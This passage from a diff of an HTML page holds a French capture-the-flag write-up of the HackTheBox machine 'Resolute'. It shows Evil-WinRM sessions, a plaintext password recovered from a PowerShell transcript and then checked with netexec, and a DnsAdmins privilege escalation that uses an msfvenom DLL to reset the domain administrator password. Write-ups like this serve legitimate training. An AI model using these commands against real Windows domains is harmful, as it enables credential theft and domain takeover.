--a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
--a-hs-        3/18/2024   3:48 PM      402653184 pagefile.sys
-
-
-*Evil-WinRM* PS C:\&gt; cd PSTranscripts
-*Evil-WinRM* PS C:\PSTranscripts&gt; dir
-*Evil-WinRM* PS C:\PSTranscripts&gt; dir -force
-
-
-    Directory: C:\PSTranscripts
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d--h--        12/3/2019   6:45 AM                20191203
-
-
-*Evil-WinRM* PS C:\PSTranscripts&gt; cd 20191203
-*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; dir -force
-
-
-    Directory: C:\PSTranscripts\20191203
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">dir </span><span class="n">-force</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">d</span><span class="p">-</span><span class="n">-hs</span><span class="p">-</span>        <span class="n">3</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span>   <span class="n">4</span><span class="p">:</span><span class="n">29</span> <span class="n">PM</span>                <span class="nv">$RECYCLE</span><span class="p">.</span><span class="n">BIN</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="n">d</span><span class="p">-</span><span class="n">-hsl</span>        <span class="n">9</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2019</span>  <span class="n">10</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>                <span class="n">Documents</span> <span class="n">and</span> <span class="n">Settings</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">9</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2019</span>   <span class="n">6</span><span class="p">:</span><span class="n">19</span> <span class="n">AM</span>                <span class="n">PerfLogs</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="n">d-r</span><span class="p">---</span>        <span class="n">9</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2019</span>  <span class="n">12</span><span class="p">:</span><span class="n">39</span> <span class="n">PM</span>                <span class="n">Program</span> <span class="n">Files</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="n">d</span><span class="p">-----</span>       <span class="n">11</span><span class="p">/</span><span class="n">20</span><span class="p">/</span><span class="n">2016</span>   <span class="n">6</span><span class="p">:</span><span class="n">36</span> <span class="n">PM</span>                <span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="n">d</span><span class="p">-</span><span class="n">-h</span><span class="p">--</span>        <span class="n">9</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2019</span>  <span class="n">10</span><span class="p">:</span><span class="n">48</span> <span class="n">AM</span>                <span class="n">ProgramData</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="n">d</span><span class="p">-</span><span class="n">-h</span><span class="p">--</span>        <span class="n">12</span><span class="p">/</span><span class="n">3</span><span class="p">/</span><span class="n">2019</span>   <span class="n">6</span><span class="p">:</span><span class="n">32</span> <span class="n">AM</span>                <span class="n">PSTranscripts</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="n">d</span><span class="p">-</span><span class="n">-hs</span><span class="p">-</span>        <span class="n">9</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2019</span>  <span class="n">10</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>                <span class="n">Recovery</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="n">d</span><span class="p">-</span><span class="n">-hs</span><span class="p">-</span>        <span class="n">9</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2019</span>   <span class="n">6</span><span class="p">:</span><span class="n">25</span> <span class="n">AM</span>                <span class="n">System</span> <span class="n">Volume</span> <span class="n">Information</span>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="n">d-r</span><span class="p">---</span>        <span class="n">12</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2019</span>   <span class="n">2</span><span class="p">:</span><span class="n">46</span> <span class="n">AM</span>                <span class="n">Users</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">12</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2019</span>   <span class="n">5</span><span class="p">:</span><span class="n">15</span> <span class="n">AM</span>                <span class="n">Windows</span>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="n">-arhs</span><span class="p">-</span>       <span class="n">11</span><span class="p">/</span><span class="n">20</span><span class="p">/</span><span class="n">2016</span>   <span class="n">5</span><span class="p">:</span><span class="n">59</span> <span class="n">PM</span>         <span class="n">389408</span> <span class="n">bootmgr</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="n">-a-hs</span><span class="p">-</span>        <span class="n">7</span><span class="p">/</span><span class="n">16</span><span class="p">/</span><span class="n">2016</span>   <span class="n">6</span><span class="p">:</span><span class="n">10</span> <span class="n">AM</span>              <span class="n">1</span> <span class="n">BOOTNXT</span>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="n">-a-hs</span><span class="p">-</span>        <span class="n">3</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span>   <span class="n">3</span><span class="p">:</span><span class="n">48</span> <span class="n">PM</span>      <span class="n">402653184</span> <span class="n">pagefile</span><span class="p">.</span><span class="n">sys</span>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">cd </span><span class="n">PSTranscripts</span>
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">PSTranscripts</span><span class="p">&gt;</span> <span class="nb">dir</span>
+</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">PSTranscripts</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="n">-force</span>
+</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>
+</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
+</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">PSTranscripts</span>
+</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>
+</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>
+</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a><span class="n">d</span><span class="p">-</span><span class="n">-h</span><span class="p">--</span>        <span class="n">12</span><span class="p">/</span><span class="n">3</span><span class="p">/</span><span class="n">2019</span>   <span class="n">6</span><span class="p">:</span><span class="n">45</span> <span class="n">AM</span>                <span class="n">20191203</span>
+</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>
+</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>
+</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">PSTranscripts</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="n">20191203</span>
+</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">PSTranscripts</span><span class="p">\</span><span class="n">20191203</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="n">-force</span>
+</span><span id="__span-9-39"><a id="__codelineno-9-39" name="__codelineno-9-39" href="#__codelineno-9-39"></a>
+</span><span id="__span-9-40"><a id="__codelineno-9-40" name="__codelineno-9-40" href="#__codelineno-9-40"></a>
+</span><span id="__span-9-41"><a id="__codelineno-9-41" name="__codelineno-9-41" href="#__codelineno-9-41"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">PSTranscripts</span><span class="p">\</span><span class="n">20191203</span>
+</span><span id="__span-9-42"><a id="__codelineno-9-42" name="__codelineno-9-42" href="#__codelineno-9-42"></a>
+</span><span id="__span-9-43"><a id="__codelineno-9-43" name="__codelineno-9-43" href="#__codelineno-9-43"></a>
+</span><span id="__span-9-44"><a id="__codelineno-9-44" name="__codelineno-9-44" href="#__codelineno-9-44"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45" href="#__codelineno-9-45"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46" href="#__codelineno-9-46"></a><span class="n">-arh</span><span class="p">--</span>        <span class="n">12</span><span class="p">/</span><span class="n">3</span><span class="p">/</span><span class="n">2019</span>   <span class="n">6</span><span class="p">:</span><span class="n">45</span> <span class="n">AM</span>           <span class="n">3732</span> <span class="n">PowerShell_transcript</span><span class="p">.</span><span class="n">RESOLUTE</span><span class="p">.</span><span class="n">OJuoBGhU</span><span class="p">.</span><span class="n">20191203063201</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
 <p>à l'intérieur de ce .txt :</p>
-<pre><code class="language-powershell">&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">&gt;&gt;</span> <span class="n">ParameterBinding</span><span class="p">(</span><span class="nb">Invoke-Expression</span><span class="p">):</span> <span class="n">name</span><span class="p">=</span><span class="s2">&quot;Command&quot;</span><span class="p">;</span> <span class="n">value</span><span class="p">=</span><span class="s2">&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span>
+</span></code></pre></div>
 <p>Le pass fonctionne :</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~$ netexec smb 10.129.167.19 -u ryan -p 'Serv3r4Admin4cc123!'
-SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
-SMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>pak@DESKTOP-AF1CU53:~$<span class="w"> </span>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-u<span class="w"> </span>ryan<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Serv3r4Admin4cc123!&#39;</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:RESOLUTE<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:megabank.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\r</span>yan:Serv3r4Admin4cc123!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></code></pre></div>
 <p><img alt="Pasted image 20240319004718" src="../../../../Files/Pasted%20image%2020240319004718.png" /></p>
 <p>L'utilisateur fait parti du groupe "dnsadmins" : il peut s'agir d'un vecteur de privesc vers l'utilisateur admin.</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~$ msfvenom -p windows/x64/exec cmd='net user administrator pakpak123! /domain' -f dll -o adduser.dll
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 309 bytes
-Final size of dll file: 9216 bytes
-Saved as: adduser.dll
-</code></pre>
-<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; upload /home/pak/adduser.dll
-
-Info: Uploading /home/pak/adduser.dll to C:\Users\ryan\Documents\adduser.dll
-
-Data: 12288 bytes of 12288 bytes copied
-
-Info: Upload successful!
-*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dir
-
-
-    Directory: C:\Users\ryan\Documents
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        3/18/2024   5:01 PM              0 adduser.dll
--a----        3/18/2024   4:58 PM              5 start
--a----        3/18/2024   4:58 PM              5 stop
-
-
-*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\ryan\Documents\adduser.dll
-
-Registry property serverlevelplugindll successfully reset.
-Command completed successfully.
-
-*Evil-WinRM* PS C:\Users\ryan\Documents&gt; cmd.exe /c 'sc stop dns'
-
-SERVICE_NAME: dns
-        TYPE               : 10  WIN32_OWN_PROCESS
-        STATE              : 3  STOP_PENDING
-                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x0
-        WAIT_HINT          : 0x0
-*Evil-WinRM* PS C:\Users\ryan\Documents&gt; cmd.exe /c 'sc start dns'
-
-SERVICE_NAME: dns
-        TYPE               : 10  WIN32_OWN_PROCESS
-        STATE              : 2  START_PENDING
-                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x0
-        WAIT_HINT          : 0x7d0
-        PID                : 1496
-        FLAGS              :
-*Evil-WinRM* PS C:\Users\ryan\Documents&gt;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>pak@DESKTOP-AF1CU53:~$<span class="w"> </span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/exec<span class="w"> </span><span class="nv">cmd</span><span class="o">=</span><span class="s1">&#39;net user administrator pakpak123! /domain&#39;</span><span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>-o<span class="w"> </span>adduser.dll
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>platform<span class="w"> </span>was<span class="w"> </span>selected,<span class="w"> </span>choosing<span class="w"> </span>Msf::Module::Platform::Windows<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>payload
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>arch<span class="w"> </span>selected,<span class="w"> </span>selecting<span class="w"> </span>arch:<span class="w"> </span>x64<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>payload
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>No<span class="w"> </span>encoder<span class="w"> </span>specified,<span class="w"> </span>outputting<span class="w"> </span>raw<span class="w"> </span>payload
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>Payload<span class="w"> </span>size:<span class="w"> </span><span class="m">309</span><span class="w"> </span>bytes
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>Final<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>dll<span class="w"> </span>file:<span class="w"> </span><span class="m">9216</span><span class="w"> </span>bytes
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>Saved<span class="w"> </span>as:<span class="w"> </span>adduser.dll
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">upload</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">pak</span><span class="p">/</span><span class="n">adduser</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">Info</span><span class="p">:</span> <span class="n">Uploading</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">pak</span><span class="p">/</span><span class="n">adduser</span><span class="p">.</span><span class="n">dll</span> <span class="n">to</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">adduser</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">Data</span><span class="p">:</span> <span class="n">12288</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">12288</span> <span class="n">bytes</span> <span class="n">copied</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="n">Info</span><span class="p">:</span> <span class="n">Upload</span> <span class="n">successful</span><span class="p">!</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">dir</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="n">-a</span><span class="p">----</span>        <span class="n">3</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span>   <span class="n">5</span><span class="p">:</span><span class="n">01</span> <span class="n">PM</span>              <span class="n">0</span> <span class="n">adduser</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="n">-a</span><span class="p">----</span>        <span class="n">3</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span>   <span class="n">4</span><span class="p">:</span><span class="n">58</span> <span class="n">PM</span>              <span class="n">5</span> <span class="nb">start</span>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="n">-a</span><span class="p">----</span>        <span class="n">3</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span>   <span class="n">4</span><span class="p">:</span><span class="n">58</span> <span class="n">PM</span>              <span class="n">5</span> <span class="n">stop</span>
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">dnscmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">adduser</span><span class="p">.</span><span class="n">dll</span>
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>
+</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="n">Registry</span> <span class="n">property</span> <span class="n">serverlevelplugindll</span> <span class="n">successfully</span> <span class="n">reset</span><span class="p">.</span>
+</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="n">Command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>
+</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s1">&#39;sc stop dns&#39;</span>
+</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a>
+</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="n">SERVICE_NAME</span><span class="p">:</span> <span class="n">dns</span>
+</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a>        <span class="nb">TYPE </span>              <span class="p">:</span> <span class="n">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
+</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>        <span class="n">STATE</span>              <span class="p">:</span> <span class="n">3</span>  <span class="n">STOP_PENDING</span>
+</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a>                                <span class="p">(</span><span class="n">STOPPABLE</span><span class="p">,</span> <span class="n">PAUSABLE</span><span class="p">,</span> <span class="n">ACCEPTS_SHUTDOWN</span><span class="p">)</span>
+</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a>        <span class="n">WIN32_EXIT_CODE</span>    <span class="p">:</span> <span class="n">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
+</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a>        <span class="n">SERVICE_EXIT_CODE</span>  <span class="p">:</span> <span class="n">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
+</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a>        <span class="n">CHECKPOINT</span>         <span class="p">:</span> <span class="n">0x0</span>
+</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a>        <span class="n">WAIT_HINT</span>          <span class="p">:</span> <span class="n">0x0</span>
